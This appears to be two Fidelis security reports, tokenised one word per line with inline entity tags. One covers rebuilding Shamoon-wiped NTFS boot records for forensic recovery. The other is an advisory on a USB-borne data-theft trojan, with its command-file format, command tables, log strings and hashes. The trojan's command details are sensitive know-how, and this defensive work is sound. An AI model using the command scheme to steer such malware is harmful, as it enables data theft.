Three
types
of
operating
systems
were
used
for
testing
purposes
;

all
testing
occurred
on
laptops
.

The
laptops
were
wiped
,
had
the
operating
system
installed
,
and
then
had
the
SHAMOON B_malware.unknown
malware I
executed
on
the
system
.

The
three
operating
systems
used
for
testing
were
Windows
XP
,
Windows
2003
,
and
Windows
7
.

The
malware
executed
with
no
issues
except
on
Windows
7
.

The
User
Access
Control
(
UAC
)
on
the
Windows
7
systems
had
to
be
turned
off
before
the
malware
would
execute
and
perform
the
wiping
action
as
has
been
observed
on
other
machines
.

This
has
been
noted
by
others
in
the
community
as
well
,
specifically
that
Administrator
access
is
needed
for
initially
launching
SHAMOON B_malware.unknown
.

SHAMOON B_malware.unknown
operation
results
in
much
of
the
data
on
the
affected
systems
being
overwritten
with
the
fragmented
image
of
a
burning
flag
.

As
has
been
detailed
above
,
the
wipe
function
will
overwrite
data
within
the
Documents
and
Settings
folder
followed
by
the
System32
folder
,
and
then
it
will
start
the
physical
disk
access
and
start
the
wiping
at
the
disk
level
.

If
the
system
restarts
before
the
malware
has
completed
wiping
the
disk
then
much
of
the
data
can
still
be
recovered
:

each
of
our
tests
showed
the
system
did
restart
before
the
disk
was
completely
wiped
.

The
amount
wiped
from
the
host
will
never
be
the
same
from
system
to
system
,
mainly
because
the
size
of
the
disk
and
partitions
will
all
need
to
be
taken
into
account
.

VBR
and
File
System
Recovery
Strategies

The
following
is
the
view
of
the
wiped
disk
for
each
of
the
operating
systems
that
we
tested
:

Fig
1
.
Example
of
wiped
of
MBR
and
VBR
wiped
by
SHAMOON B_malware.unknown
Malware I
.

Figure
1
was
found
at
the
MBR
(
Sector
0
)
and
the
VBR
(
Sector
63
/
56
(
XP
,
2003
)
,
and
2048
/
206848
(
7
)
)
of
each
of
the
operating
systems
(
As
well
as
throughout
the
drive
)
.

Fidelis

researchers
decided
to
look
further
into
the
drive
and
find
if
there
was
any
possibility
of
recovering
files
or
logs
that
would
help
illuminate
what
happened
to
the
systems
,
and
if
any
artifacts
of
the
malware
could
be
recovered
.

Note
on
the
VBR
:

VBR
stands
for
Volume
Boot
Record
,
and
is
made
up
of
the
boot
sector
and
bootstrap
code
.

The
boot
sector
takes
up
1
sector
on
the
drive
;

the
next
6
sectors
on
the
drive
are
allocated
for
the
bootstrap
code
.

In
all
16
sectors
are
allocated
in
total
for
the
VBR
.

The
VBR
is
created
when
a
file
system
is
created
on
a
partition
.

In
this
paper
we
will
be
covering
the
NTFS
Boot
Record
.

The
VBR
is
used
to
load
machine
code
into
RAM
to
start
a
program
.

Normally
this
program
is
the
operating
system
.

Keyword
searches
revealed
that
there
were
still
files
that
would
be
recoverable
on
the
system
.

In
particular
it
was
found
that
registry
files
and
headers
were
still
on
the
disk
.

After
this
,
it
was
found
that
the
Master
File
Table
(
MFT
)
was
still
,
for
the
most
part
,
intact
.

Trying
to
avoid
the
long
and
laborious
process
of
carving
files
from
the
disk
,
researchers
decided
that
it
would
instead
be
worth
the
time
to
try
and
recover
the
file
system
.

When
the
Windows
operating
system
is
installed
or
an
NTFS
volume
created
,
a
backup
copy
of
the
VBR
is
written
to
the
last
sector
of
the
volume
.

This
is
a
very
important
detail
,
as
the
forensic
value
of
the
VBR
is
substantial
(
See
Figure
2
)
.

The
area
that
will
contain
the
critical
information
is
known
as
the
Bios
Parameter
Block
(
BPB
)
.

With
this
information
it
is
possible
to
rebuild
the
file
system
as
it
existed
before
the
wipe
.

EB
52
90
4E
54
46
53
20
20
20
20
00
02
08
00
00
00
00
00
00
00
F8
00
00
3F
00
FF
00
3F
00
00
00
00
00
00
00
80
00
80
00
C0
F8
F8
0D
00
00
00
00
00
00
0C
00
00
00
00
00
8C
8F
DF
00
00
00
00
00
F6
00
00
00
01
00
00
00
26
FA
CA
70
02
CB
70
44
00
00
00
00

[
...
Truncated
for
size
...
]

00
00
55
AA

EB
52
90
–
Instruction
to
jump
to
boot
code
(
Not
necessary
for
our
application
)

4E
54
46
53
20
20
20
20
–
OEM
Name
(
NTFS
)

00
02
–
Bytes
per
sector
,
0x0200
=
512
Bytes
.

08
–
Sectors
per
cluster
=
8

F8
–
Media
descriptor
(
Not
necessary
for
our
application
)

C0
F8
F8
0D
00
00
00
00
–
Total
sectors
in
file
system
,
0x00DF8F8C0
=
234420416
Sectors
(
Add
on
the
sector
location
of
VBR
for
actual
end
of
the
file
system
,
in
this
example
the
VBR
is
at
sector
63
therefore
the
total
sectors
in
the
file
system
are
234420416
+
63
=
234420479
)

00
00
0C
00
00
00
00
00
–
Starting
cluster
of
the
MFT
,
0X000C0000
=
786432
Clusters
.

786432
*
8
(
Cluster
size
)
+
63
(
VBR
Sector
)
=
6291519
Sectors

8C
8F
DF
00
00
00
00
00
–
Starting
cluster
of
the
MFT
mirror
,
0x00DF8F8C
=
14651276
.

14651276
*
8
+
63
=
117210271
Sectors

F6
–
Size
of
MFT
Entry
,
246
.

01
–
Index
size
,
1
.

26
FA
CA
70
02
CB
70
44
–
Serial
number
.

For
more
technical
information
on
file
systems
and
their
forensic
value
,
Brian
Carrier's
book
File
System
Forensic
Analysis
is
an
invaluable
tool
.

Fig
2
.
Example
of
a
broken
down
BPB
found
within
the
boot
sector
.

Just
because
the
boot
sector
of
the
VBR
is
recoverable
doesn't
mean
that
everything
on
the
file
system
will
be
restored
to
normal
.

If
a
file
was
wiped
by
the
malware
then
it
will
still
be
wiped
,
or
partially
wiped
.

However
files
that
weren't
wiped
will
be
much
easier
and
faster
to
recover
then
carving
and
the
context
of
each
file
will
be
easy
to
interpret
.

To
recover
or
identify
the
backup
VBR
a
search
will
need
to
be
run
across
the
image
file
.

It
is
preferable
if
the
image
file
is
a
raw
image
as
they
are
easier
to
edit
then
other
image
file
formats
.

The
search
was
performed
for
the
hex
of
the
VBR
file
header
,
EB
52
90
4E
54
46
53
(
ëR
(
cid
:
0
)
NTFS
)
.

A
few
hits
were
found
throughout
the
drive
,
and
it
appeared
that
there
were
multiple
empty
VBR
templates
throughout
the
system
(
Shown
in
Figure
3
)
.

The
correct
VBR
will
likely
be
the
one
with
information
filled
in
from
offset
10
–
80
(
See
Figure
2
to
breakdown
)
.

During
testing
it
was
found
that
the
last
hit
was
normally
the
correct
VBR
,
as
this
would
be
the
VBR
found
at
the
end
of
the
volume
.

Fig
3
.
Example
of
a
blank
VBR
.

Note
:

On
2003
systems
the
boot
backup
is
sometimes
found
halfway
through
the
partition
,
a
manual
parsing
of
the
file
will
need
to
be
performed
to
confirm
the
VBR
is
legitimate
for
the
partition
.

Once
the
VBR
was
found
we
noted
the
offset
and
calculated
the
sector
to
locate
the
backup
in
our
desired
forensic
program
.

For
the
purposes
of
testing
we
used
EnCase
(
v6.19.6
)
.

Once
the
sector
of
the
backup
VBR
is
known
,
EnCase
was
started
and
the
image
of
the
infected
system
was
loaded
.

Within
disk
view
we
located
the
backup
VBR
and
right
clicked
to
add
a
manual
partition
as
an
NTFS
file
system
.

The
partition
was
added
,
the
MFT
read
,
and
the
file
system
appeared
:

Fig
4
.
File
system
recovered
within
EnCase
.

With
the
file
system
restored
some
relevant
artifacts
can
be
located
now
,
and
an
actual
computer
forensic
examination
can
take
place
.

This
recovery
can
be
successful
without
the
use
of
the
EnCase
suite
of
forensic
software
as
well
.

Using
a
hex
editor
of
your
choice
to
repair
the
image
,
in
our
testing
WinHex
(
16.6
)
was
used
.

Find
the
file
header
of
the
backup
VBR
within
a
file
editor
,
copy
from
the
header
to
footer
of
the
boot
sector
;

the
footer
will
always
be
55
AA
.

The
size
will
be
512
bytes
from
header
to
footer
.

Then
depending
on
what
operating
system
is
being
examined
you
can
write
the
copied
boot
sector
to
the
appropriate
sector
on
the
affected
image
.

Placing
the
boot
sector
into
the
correct
location
will
be
the
trickiest
part
as
incorrect
placement
will
result
in
the
file
system
not
being
recognized
.

The
boot
sector
should
be
placed
at
sector
63
/
56
for
XP
/
2003
,
and
at
sector
2048
/
206848
for
Windows
7
.

After
this
is
complete
you
will
be
able
to
add
the
image
into
the
forensic
program
.

If
the
file
system
is
not
recognized
then
it
is
possible
that
the
MBR
will
need
to
be
reconstructed
,
though
this
is
unlikely
.

Before
rebuilding
the
MBR
try
adding
the
image
as
a
volume
and
not
as
a
disk
.

Note
:

Other
recovery
techniques
are
certainly
viable
as
well
.

There
are
automated
partition
rebuilding
tools
available
,
though
some
of
these
rely
on
a
valid
MBR
to
work
properly
(
In
this
case
that
wouldn't
be
feasible
)
.

Other
options
would
be
the
fixboot
command
from
the
Windows
Recovery
Console
found
on
a
Windows
OS
disk
.

What
we
have
presented
here
are
forensically
sound
methods
that
are
easily
repeatable
and
least
damaging
to
the
evidence
/
mage
.

Multiple
Partition
Recovery
Strategies

For
testing
purposes
the
system
with
Windows
2003
was
set
up
with
three
different
partitions
.

We
wanted
to
emulate
the
situation
in
which
one
would
have
multiple
partitions
on
the
computers
,
as
is
quite
common
.

Conceivably
the
malware
should
wipe
all
of
these
partitions
as
well
,
as
has
been
seen
within
the
code
of
the
malware
.

What
we
wanted
to
look
at
was
the
extent
of
the
wiping
on
the
partitions
and
whether
the
same
techniques
that
were
applied
to
a
single
partitioned
drive
would
still
apply
on
the
multiple
partitioned
drive
.

In
theory
each
partition
should
be
recoverable
,
as
non-bootable
partitions
still
create
a
VBR
and
place
the
backup
at
the
end
of
the
partition
when
a
NTFS
file
system
is
installed
.

After
searching

through
the
drive
we
found
that
there
were
three
VBRs
that
all
seemed
to
have
corresponding
information
for
the
partitions
that
were
originally
created
.

On
our
test
system
we
found
that
EnCase
was
not
adding
the
partitions
in
a
way
that
would
recognize
the
file
system
as
it
did
for
the
other
systems
.

This
could
be
because
our
boot
sector
was
at
sector
56
and
not
63
,
or
because
the
multiple
partitions
clash
when
trying
to
add
them
in
.

We
ended
up
having
to
edit
the
image
by
adding
the
backup
boot
sectors
into
the
correct
sector
where
the
originals
were
found
.

Partition
Boot
Sector
Placed
At
Backup
Boot
Sector
1
(
Primary
)
56
41926079
2
41926080
62417879
3
62417880
82909679

Fig
5
.
VBR
Placement
in
Windows
2003

Note
:
The
VBR
placement
for
the
next
partition
starts
after
the
backup
VBR
of
the
preceding
partition
.

Once
the
VBRs
were
added
correctly
we
proceeded
to
add
the
partitions
into
EnCase
.

Fig
6
.
Reconstructed
file
system
of
a
Windows
2003
operating
system
wiped
by
SHAMOON B_malware.unknown
.

Note
:

EnCase
gives
default
volume
labels
when
added
,
so
C
,
D
,
and
E
are
respectively
1
,
2
,
and

The
extent
of
the
wiping
appeared
to
be
on
the
same
level
to
what
was
found
on
single
partitioned
drives
.

As
mentioned
before
this
was
to
be
expected
as
the
malware
tries
to
wipe
mounted
and
other
volumes
first
and
will
then
move
to
the
primary
volume
(
1
/
C
)
.

The
Fidelis
Take

Fidelis
researchers
have
developed
a
set
of
rules
for
detecting
the
SHAMOON B_malware.unknown
malware I
along
the
entire
threat
life
cycle
:
initial
infection
,
lateral
propagation
,
and
command
and
control
communication
.

The
embedded
malware
detection
engine
also
recognizes
the
variant
of
SHAMOON B_malware.unknown
malware I
analyzed
.

All
sensor
configurations
are
capable
of
detecting
the
initial
infection
and
the
command
and
control
communication
,
and
the
Fidelis
XPS
Internal
Sensor
is
required
for
detecting
the
lateral
movement
of
the
malicious
program
.

Further
Reading

•
SHAMOON B_malware.unknown
the
Wiper
Copycats
at
Work
(
2012
)
,
retrieved
26
Oct
2012
from
http://www.securelist.com/en/blog/208193786/SHAMOON_the_Wiper_Copycats_at_Work B_url.normal

•
SHAMOON B_malware.unknown
the
Wiper
in
details
,
Tarakanov
,
Dmitry
(
2012
)
,
retrieved
26
Oct
2012
from
http://www.securelist.com/en/blog/208193795/SHAMOON_the_Wiper_in_details B_url.normal

•
SHAMOON B_malware.unknown
the
Wiper
in
details
II
,
Tarakanov
,
Dmitry
(
2012
)
,
retrieved
26
Oct
2012
from
http://www.securelist.com/en/blog/208193834/SHAMOON_The_Wiper_further_details_Part_II B_url.normal

•
SHAMOON B_malware.unknown
,
a
two-staged
targeted
attack
(
2012
)
,
retrieved
26
Oct
2012
from
http://blog.seculert.com/2012/08/SHAMOON-two-stage-targeted-attack.html B_url.normal

•
'
SHAMOON B_malware.unknown
'
Virus
Most
Destructive
Ever
To
Hit
A
Business
,
Leon
Panetta
Warns
(
2012
)
,
retrieved
from
http://www.huffingtonpost.com/2012/10/11/SHAMOON-virus-leonpanetta_n_1960113.html B_url.normal

•
Carrier
,
Brian
(
2005
)
.

File
System
Forensic
Analysis
.

Upper
Saddle
River
,
NJ
:
Pearson
Education
Inc
.
Follow-Up
#
1
Fidelis
Threat
Advisory
#1011

Intruder
File
Report
-
Sneakernet B_malware.backdoor
Trojan I

January
31
,
2014

Document
Status
:
FINAL

Last
Revised
:
2014-01-31

Executive
Summary

Previous
General
Dynamics
Fidelis
Cybersecurity
Services
(
Fidelis
)
reporting
,
ref
:
Fidelis
Threat
Advisory
(
FTA
)
#
1011
dated
15
Jan
2014
,
introduced
a
malware
system
comprised
of
multiple
files
that
provided
a
means
for
intruders
to
discover
and
retrieve
data
from
disparate
computer
systems
via
removable
storage
devices
.

The
malware
system
consists
of
at
least
two
Portable
Executable
(
PE
)
files
,
one
acting
as
a
headquarters
component
and
one
acting
as
field
unit
or
agent
component
.

The
headquarters
component
infects
drives
connected
to
its
host
system
with
the
field
unit
component
and
retrieves
data
from
the
field
unit
on
the
infected
drive's
return
to
the
headquarters
host
system
.

The
field
unit
conducts
reconnaissance
and
data
collection
in
accordance
with
particular
commands
.

Continuing
analysis
solidified
the
headquarters
component's
Command
and
Control
(
C2
)
scheme
.

The
malware
receives
commands
from
a
locally
stored
encrypted
file
.

This
report
describes
select
malware
functionality
with
some
granularity
,
provides
extended
detail
regarding
the
headquarters
component's
C2
functionality
,
provides
additional
means
of
defensive
detection
of
this
malware
and
describes
some
interesting
aspects
of
the
malware
as
a
whole
.

The
Fidelis
team
updated
Fidelis
XPSTM
advanced
threat
defense
system
with
additional
rules
to
reflect
current
analysis
findings
associated
with
this
malware
.

Forensic
Analysis
Findings

Basic
Functionality

Previous
reporting
,
ref
:
Fidelis
Threat
Advisory
(
FTA
)
#1011
dated
15
Jan
2014
,
introduced
a
malware
system
comprised
of
multiple
files
that
reflected
a
means
for
intruders
to
discover
and
retrieve
data
from
disparate
computer
systems
via
removable
storage
devices
.

Analysis
of
the
system
relied
on
the
availability
of
two
files
named
netsat.exe
and
netui3.dll
.

Netsat.exe B_malware.drop
functioned
as
a
master
application
affording
intruders
the
ability
,
in
a
selective
and
controlled
manner
,
to
infest
removable
devices
with
an
agent
application
in
the
form
of
netui3.dll
,
aka

Users
are
granted
permission
to
copy
and
/
or
distribute
this
document
in
its
original
electronic
form
and
print
copies
for
personal
use
.

This
document
cannot
be
modified
or
converted
to
any
other
electronic
or
machine-readable
form
in
whole
or
in
part
without
prior
written
approval
of
General
Dynamics
Fidelis
Cybersecurity
Solutions
Inc
.

While
we
have
done
our
best
to
ensure
that
the
material
found
in
this
document
is
accurate
,
General
Dynamics
Fidelis
Cybersecurity
Solutions
makes
no
guarantee
that
the
information
contained
herein
is
error
free
.

setup35.exe
,
aka
update.exe
.

Previous
reporting
likened
netsat.exe
as
a
headquarters
application
and
netui3.dll
as
a
field
unit
with
the
following
basic
functionality
:

Headquarters
(
netsat.exe
)

•
Running
on
a
possibly
compromised
system

•
Logging
some
activity
and
errors
to
a
file

•
Receiving
commands
via
an
encrypted
file
on
the
local
system
(
possible
C2
)

•
Listening
for
drive
connections

•
Infecting
connected
drives
with
netui3.dll
/
winmgt.dll
(
setup35.exe
+
Autorun.inf
)

•
Collecting
data
gathered
by
any
infected
drives
,
ostensibly
upon
their
return
from
being
connected
to
other
systems

Field
Unit
(
netui3.dll
)

•
Collecting
information
about
systems
it
comes
into
contact
with
through
connection
to
the
targeted
systems
with
the
drive
whereon
the
malware
resides

•
Collecting
file
listings
from
local
and
share
connected
drives

•
Discovering
and
connecting
to
shared
drives
visible
to
the
local
targeted
system

•
Copying
and
writing
files
to
/
from
drives
visible
to
the
local
targeted
system

The
following
graphic
serves
to
illustrate
a
possible
basic
theory
of
operation
given
available
data
:

Field
Unit
(
netui3.dll
/
setup35.exe
/
update.exe
)
Functionality

File
Name
:
netui3.dll

File
Size
:
39424
bytes

MD5
:
68aed7b1f171b928913780d5b21f7617 B_hash

Continued
analysis
disclosed
details
regarding
the
field
unit/agent
application
.

The
following
reflects
observations
during
field
unit
execution
from
an
infected
external
drive
:

•
The
malware
attempts
to
ensure
errors
are
suppressed
and
not
observed
by
a
user

•
The
malware
performs
specific
environment
checking
to
adapt
to
Windows
versions
from
at
least
Windows
2000
to
Windows7
/
Server
2008
and
up

•
The
malware
terminates
if
it
detects
another
iteration
of
itself
via
the
Mutex

•
The
malware
terminates
if
any
Gateway
IPs
associated
with
the
resident
system
are
'
Mtx_Sp_on_PC_1_2_8
'
in
the
10.x.x.x B_ip.normal
range

•
The
malware
copies
itself
to
<
CSIDL_LOCAL_APPDATA
>
\
Microsoft
\
Windows
\
Help
\
update.exe

•
The
malware
runs
update.exe
with
the
parameters
'
-
wu
external
drive
letter
'
,
e.g.
,
z
:
,
with
the
temporary
directory
specified
for
the
working
directory

•
The
malware
copies
a
file
named
~
disk.ini
from
the
infected
drive
to
<
CSIDL_LOCAL_APPDATA
>
\
Microsoft
\
Windows
\
Help
\
intr

•
The
malware
checks
the
system
date
against
31
May
2013
;
if
on
or
after
,
the
malware
terminates

•
The
malware
copies
<
CSIDL_LOCAL_APPDATA
>
\
Microsoft
\
Windows
\
Help
\
intr
to
<
CSIDL_LOCAL_APPDATA
>
\
Microsoft
\
Windows
\
Chars
\
intr

Headquarters
(
netsat.exe
)
Functionality
–
C2
Mechanism

File
Name
:
netsat.exe

File
Size
:
43520
bytes

MD5
:
eb8399483b55f416e48a320d68597d72 B_hash

Previous
analysis
results
indicated
netsat.exe
retrieved
commands
from
an
encrypted
file
named
netwn.drv
resident
in
the
CSIDL_WINDOWS
\
msagent
\
directory
.

The
encryption
was
a
Tiny
Encryption
Algorithm
(
TEA
)
implementation
that
used
a
key
that
was
modified
during
encryption
and
decryption
operations
.

The
following
command
file
hex
editor
excerpt
illustrates
the
command
file's
obfuscation
in
a
contrived
instance
:

Offset
0
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15

00000000
AA
AA
AA
BE
BA
FE
CA
EF
BE
AD
DE
0D
F0
AD
0B
ED
aaa3
⁄
4oþÊï3
⁄
4­Þ
ð­
í

00000016
FE
DE
C0
10
00
BB
6D
E4
40
60
34
CC
6A
0A
B7
2A
þÞÀ
'
mä
@
'
4Ìj
·
*

00000032
AA
43
C5
86
C6
10
00
FD
5B
ED
CE
BE
6C
D8
42
B4
aCÅ†Æ
ý
[
íÎ3
⁄
4lØB
́

00000048
90
AE
36
31
5D
40
A3
10
00
C0
5E
8A
4C
0F
0C
72
®
61
]
@£
À^ŠL
r

00000064
2E
AA
A2
28
20
16
20
0E
7A
.a¢
(
z

Note
:
1st
Three
Bytes
=
Unknown
utility
,
Next
16
bytes
=
Encryption
Key
,
Bytes
20
and
21
=
Command
Data
Size
,
Bytes
22
-
37
=
encrypted
command
data

Command
Data
Before
Encryption
/
After
Decryption
@
@
d81596a9
ferry
0
dir
5

Analysis
efforts
did
not
have
access
to
'
command
'
files
retrieved
from
the
victim
systems
for
either
the
headquarters
or
the
field
unit
applications
.

However
,
using
the
malware's
behavior
and
determining
the
command
file's
format
via
reverse
engineering
afforded
the
ability
to
test
numerous
assumptions
about
the
malware's
intended
use
.

Analysis
determined
the
command
format
was
:
drive
identification
followed
by
one
or
more
command
and
parameter
strings
.

The
following
table
reflects
testing
and
theoretical
contents
of
command
files
driving
netsat.exe
operation
:

Test B_malware.backdoor
Commands I
One I
-­‐
Infection
Attempt
and
Retrieval
of
Data
Collection
From
a
Remote
System

Command
Description
Outcome

@
@
notmyser

designates
a
volume
serial
number

ferry
1
infect
the
just
listed
identified
drive

fails
because
notmyser
does
not
match
an
attached
drive

@
@
d81596a9

designates
a
volume
serial
number

this
S
/
N
is
from
actually
attached
drive

getres

collect
data
harvested
from
a
targeted
system

success
copies
data
from
ext.drv
\
RECYCLED
\
RECYCLED
\
SYS
to
<
CSIDL_NETHOOD
>
\
Microsoft
\
Intel
(
Note
:
before
copy
checks
if
file
exists
in
\
Intel
and
determines
file
size
-­‐
the
implication
is
the
possibility
of
updating
previously
retrieved
files
)

@
@
00

designates
any
connected
drive

00
acts
a
wildcard
for
volume
serial
number

dir
5

retrieve
a
directory
listing

did
not
execute
because
a
volume
serial
number
(
d81596a9
)
was
previously
found

Test
Commands
Two
-­‐
Retrieve
Directory
Listing
From
Any
Connected
Drive
and
Attempt
Data
Collection
Retrieval

Command
Description
Outcome

@
@
00

designates
any
connected
drive

dir
5

retrieve
a
directory
listing

directory
listing
obtained
from
next
connected
drive

@
@
d81596a9

designates
a
volume
serial
number

this
S
/
N
is
from
actually
attached
drive

getres

collect
data
harvested
from
a
targeted
system

did
not
execute

The
Following
Are
Hypothetical
Scenarios
Designed
to
Illustrate
Possible
Employment
Options

Possible
Commands
One
-­‐
Targeting
Specific
Devices
(
Known
to
Intruder
From
Previous
netsat
/
netui3
Activity
)

Command
Description

@
@
sernum1

designates
a
volume
serial
number

getres

collect
data
harvested
from
a
targeted
system

@
@
sernum2

designates
a
volume
serial
number

ferry
1

infect
this
particular
drive

@
@
00

designates
any
connected
volume
not
listed
above

dir
4

retrieve
a
directory
listing
from
the
just
connected
drive
,
re
:
00

Possible
Commands
Two
-­‐
Maximizing
Propagation
(
Theoretical
)

Command

@
@
sernum1

Description
designates
a
particular
volume
serial
number

cmd1

particular
command

cmd2

particular
command

@
@
sernum2

designates
a
particular
volume
serial
number

cmd3

particular
command

cmd4

particular
command

cmd5

particular
command

@
@
00

designates
any
connected
volume
not
listed
above

ferry
0

infect
the
just
connected
drive
,
re
:
00

dir
5

retrieve
a
directory
listing
from
the
just
connected
drive
,
re
:
00

Headquarters
(
netsat.exe
)
Functionality
–
Log
File

The
headquarters
component
(
netsat.exe
)
logs
certain
events
in
a
file
located
at
CSIDL_MYPICTURES
\
wins
.

Analysis
indicates
the
log
file
is
probably
stored
in
the
clear
,
i.e.
,
the
contents
are
not
obfuscated
.

Example
log
file
contents
are
presented
as
follows
:

St
01
/
18
/
13
12
:
03
:
30
into
d81596a9
ar
01
/
18
/
13
12
:
03
:
44

Total
:
30532M
,
Free
:
30387M

End
copy
:
E
:
\
RECYCLED
\
RECYCLED
\
SYS
\
file1.txt

End
copy
:
E
:
\
RECYCLED
\
RECYCLED
\
SYS
\
interesting.txt

Re
on
Fin

The
following
strings
,
which
are
not
all
inclusive
or
exclusive
,
could
be
used
to
find
log
files
,
fragments
or
contents
on
devices
and
on
a
network
:

Format
String
Example
/
Explanation

'
Total
:
%I64dM
,
Free
:
%I64dM
'

Total
:
30532M
,
Free
:
30387M

'
!
Get
disk
space
'

'
error
=
%d
'

errors
=
3

'
!
add
drive
,
n
=
'

'
!add
drive
,
n
=
5
'
(
5
represents
E
drive
)

'
!
u
ser
'

'
%08x
ar
%s
%s
'

<8
hex
digits
>
ar
<
date
>
<
time
>

'
Can't
open
file
%s
,
error
=
%d
'

'
ERROR
Register
notification
'

'
!Up
'

'
!
ad
dri
,
nD
=
%d
'

'
!
ad
dri
,
nD
=
5
'

'
!
Cr
Des
\
n
'

Indicates
failure
to
open
desktop.ini
for
writing

'
!
Cr
De.i.
err
=
%d\n
'

Specifies
error
code
for
failure
to
open
desktop.ini
for
writing

'
!
up
%s
\n
e
:
%d\n
'

Indicates
failure
to
create
the

RECYLCED
/
RECYCLER
directory
.

Example
:
'
!
up
E
:
<
newline
>
e
:
3
'

'
Get
Dir_c1
error
!
'

Indicates
failure
to
retrieve
that
CSIDL_WINDOWS
path
for
building
of
the
netwi.drv
path
during
ferry
command

Format
String
Example
/
Explanation

'
!cp
cf
e
:
%d
'

Indicates
error
copying
netwi.drv
to
~
disk.ini
.

'
!
c
r
\
n
'

Indicates
error
copying
setup35.exe

'
!
c
tr
\
n
'

'
!
c
.inf
,
e
:
%d
'
'

Indicates
error
opening
AutoRun.inf
for
binary
write

'
!
C
c
\
n
'

'
!
c
.inf
'

Indicates
could
not
create
AutoRun.inf


'
!
c
ser
'

Indicates
could
not
copy
netu3.dll
/
setup35.exe

'
!
Get
volume
path
=
%s
'

'
!
Get
disk
memory
'

Interesting
Artifacts
and
Observations

Previous
and
continuing
analysis
results
indicated
some
interesting
and
/
or
relevant
aspects
of
this
malware
:

•
The
malware
tries
to
be
quiet
-
error
handling

•
There
was
robust
implementation
intention
across
Windows
versions

•
The
malware
employs
robust
environment
checking
;
frustrating
inadvertent
execution
and
analysis

•
The
malware
prevents
multiple
iterations
of
itself
on
individual
systems

•
The
malware
does
not
run
on
systems
using
Gateways
assigned
a
particular
internal
net
range
(
10.x.x.x B_ip.normal
)

•
The
malware's
execution
has
an
expiration
date

•
The
malware
purposely
obfuscates
and
complicates
C2

•
The
malware
injects
complexity
into
C2
encryption
operations
;
obfuscating
execution
and
frustrating
/
delaying
analysis

•
The
malware
uses
obscure
file
system
paths

•
The
malware
author
,
ironically
or
purposely
,
named
a
collected
data
storage
folder
'
Intel
'

The
following
interesting
questions
\
/
assumptions
emerged
from
previous
cursory
analysis
of
this
malware
:

•
C2
appears
to
be
accomplished
via
providing
commands
in
an
encrypted
file
stored
on
the
local
'
master
'
system
(
re
:
netsat.exe
)
.

This
C2
scheme
would
seem
to
dictate
:

o
Intruder
remote
access
to
the
'
master
'
system

o
Intruder
local
access
to
the
'
master
'
system

o
a
C2
delivery
/
retrieval
component
,
such
as
another
piece
of
code
that
downloads
a
C2
file

•
Available
information
precludes
determination
of
the
means
of
exfiltration
.

Netsat.exe's
data
collection
functionality
suggested
data
destined
for
exfiltration
might
be
collected
by
the
'
master
'
system
.

This
possibility
suggests
:

o
Intruder
remote
access
to
the
'
master
'
system

o
Intruder
local
access
to
the
'
master
'
system

o
An
exfiltration
mechanism
in
the
form
of
another
piece
of
code

Further
analysis
confirms
the
malware's
use
of
an
encrypted
file
stored
on
the
system
whereon
the
malware
is
executing
without
an
apparent
means
of
automatic
generation
.

This
continues
to
suggest
that
intruders
either
have
local
or
remote B_malware.backdoor
access I
to I
headquarters I
systems I
running
netsat.exe
or
access
to
another
application
that
automates
remote
C2
data
/
file
retrieval
.

Intruders
'
apparent
ability
to
distinguish
between
particular
field
unit
vehicles
(
infected
drives
)
,
ref
:
Possible
Commands
One
-­‐
Targeting
Specific
Devices
(
Known
to
Intruder
From
Previous
netsat
/
netui3
Activity
)
from
Hypothetical B_malware.backdoor
command I
table I
,
suggests
active
engagement
with
the
malware
and
targets
.

Conclusion

This
report
is
based
on
information
extracted
from
reverse
engineering
and
analysis
of
two
PE
files
.

There
are
other
components
and
artifacts
of
this
malware
that
are
currently
inaccessible
to
Fidelis
analysts
.

Therefore
,
analysts
extrapolated
some
of
the
behavior
presented
here
.

While
analysts
are
confident
about
behaviors
described
to
date
,
there
could
certainly
be
additional
behaviors
and
nuances
heretofore
unseen
.

Analysis
of
this
malware
continues
to
suggest
that
a
sophisticated
effort
was
behind
its
creation
and
employment
.

Actors
went
to
great
lengths
to
make
the
malware
efficient
and
effective
while
building
in
obfuscation
and
complexity
.

Interesting
artifacts
and
observations
continue
to
be
discovered
and
made
,
such
as
the
malware's
apparent
expiration
,
the
interesting
naming
convention
for
a
directory
to
hold
collected
data
,
and
the
actors
'
apparent
intention
to
avoid
certain
networks
or
network
addressing
schemes
.

Analysis
continues
and
any
relevant
additional
information
will
be
reported
as
soon
as
practicable
.

Appendix
1
Commands
(
for
reference
purposes
)

The
following
commands
and
their
descriptions
,
listed
by
executable
file
,
illustrate
the
submitted
malware's
functionality
:

netsat.exe

Command
Description

cpd

copies
directories
and
contents

cpr

copies
files
with
size
checking

der

deletes
files
and
records
activity
in
log

dir

obtains
a
directory
listing

ferry

writes
malicious
files
to
a
hidden
RECYCLED
or
RECYCLER
directory
Files
:
setup35.exe
(
renamed
netui3.dll
)
,
Autorun.inf
,
~
disk.ini
(
renamed
netwi.drv
)
,
act.te

getres

iteratively
copies
files
from
RECYCLED
/
RECYCLER
directory
on
target
drive
,
deletes
from
source
after
copy
-­‐
source
is
assumed
to
be
drive
used
to
collect
data
from
one
or
more
systems
ferry
getres
netui3.dll
(
setup35.exe
)

netui3.dll
(
setup35.exe
)

Command
Description

cp

copies
files
from
one
location
to
another

cpu

copies
files
from
one
location
to
another
setting
copied
files
as
hidden

cptur

creates
a
directory
and
copies
file
to
that
directory

drr

silently
deletes
directory
(
performs
an
FO_DELETE
shell
file
operation
on
a
directory
with
the
FOF_NOERRORUI
,
FOF_NOCONFIRMATION
,
and
FOF_SILENT
flags
set
)

del

deletes
a
file

delu

deletes
a
file
after
setting
attributes
to
normal

gd

recursively
writes
and
reads
encoded
data
to
/
from
a
directory

gdir

prints
directory
listings
to
~
FF323D.tmp
;
data
gets
encoded
;
original
~
FF323D.tmp
file
is
deleted

gf

writes
and
reads
encoded
data
to
/
from
a
file

netui3.dll
(
setup35.exe
)

Command
Description

gfover

determines
if
it
has
access
to
a
file
;
may
be
a
temp
file
creation
/
rename
involved

gi

collects
system
related
and
possibly
network
related
information
such
as
,
domains
,
system
information

ndr

creates
a
directory

newend

closes
a
file
that
was
opened
for
writing

newstar

sets
normal
attributes
on
a
targeted
file
,
deletes
the
file
,
opens
the
same
file
name
as
a
binary
file

wr

writes
a
string
to
a
new
file
opened
by
the
newstar
command
.

runb

try
to
run
a
targeted
executable
and
then
checks
for
the
existence
of
that
file
every
second
for
the
next
15
minutes
as
long
as
it
exists

rune

try
to
run
a
targeted
executable
one
time

slf

generates
a
targeted
file
listing
,
e.g.
,
dir
,
then
copies
